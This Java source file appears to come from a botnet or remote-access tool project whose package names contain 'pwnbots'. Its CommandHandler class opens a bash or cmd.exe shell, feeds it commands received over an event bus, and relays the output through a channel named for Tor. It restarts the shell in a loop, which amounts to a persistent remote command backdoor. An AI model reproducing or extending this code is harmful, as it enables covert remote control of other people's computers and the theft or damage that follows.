package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.commands.handler;

import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.control.ControlEvent;

import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.header.CommonHeader;
import com.google.common.eventbus.Subscribe;
import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.command.CommandEvent;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import org.apache.commons.lang3.SystemUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class CommandHandler implements Runnable {

    Logger logger = LoggerFactory.getLogger(getClass());

    public void register() {
        CommonHeader.getEVENT_HEADER().getCommandEventBus().register(this);
    }
    private ProcessBuilder processBuilder;
    private Process process;
    private Thread commandReader;

    private BufferedReader bufferedReader;
    private PrintWriter printWriter;

    boolean power = true;

    @Override
    public void run() {
        Thread.currentThread().setName("CommandHandler-commandReader");
        do {
            try {
                //------------------------------------------------------
                this.process = processBuilder.start();
                bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                this.printWriter = new PrintWriter(process.getOutputStream());
                //OUTPUT
                String line;

                CommandEvent commandEventInit = new CommandEvent();
                commandEventInit.setOutput("Shell opened");

                CommonHeader.getEVENT_HEADER().getTorEventBus().post(commandEventInit);

                while ((line = bufferedReader.readLine()) != null) {
                    CommandEvent commandEvent = new CommandEvent();
                    commandEvent.setOutput(line);
                    CommonHeader.getEVENT_HEADER().getTorEventBus().post(commandEvent);
                }
                try {
                    bufferedReader.close();
                } catch (IOException e) {
                    logger.info("", e);
                }
                try {
                    printWriter.close();
                } catch (Exception e) {
                    logger.info("", e);
                }
            } catch (IOException e) {
                logger.error("", e);
            } finally {
                process.destroy();
            }
        } while (power);
    }

    //FROM controlEventPoint
    private void init() {
        this.processBuilder = new ProcessBuilder();
        if (SystemUtils.IS_OS_WINDOWS) {
            processBuilder.command("cmd.exe");
        } else if (SystemUtils.IS_OS_LINUX) {
            processBuilder.command("/bin/bash");
        }
        processBuilder.redirectErrorStream(true);
    }

    //FROM controlEventPoint
    private void start() {
        commandReader = new Thread(this);
        commandReader.start();
        //------------------------------------------------------
    }

    //-----------------------------CONTROL--------------------------------------
    @Subscribe
    void controlEventPoint(ControlEvent event) {
        ControlEvent controlEvent = (ControlEvent) event;
        ControlEvent.CONTROL_TYPE type = controlEvent.getType();
        switch (type) {
            case INIT:
                init();
                break;
            case START:
                start();
                break;
            default:
                break;
        }
    }

    @Subscribe
    void executeCommands(CommandEvent event) {
        String command = event.getCommand();
        printWriter.println(command);
        printWriter.flush();
    }
}
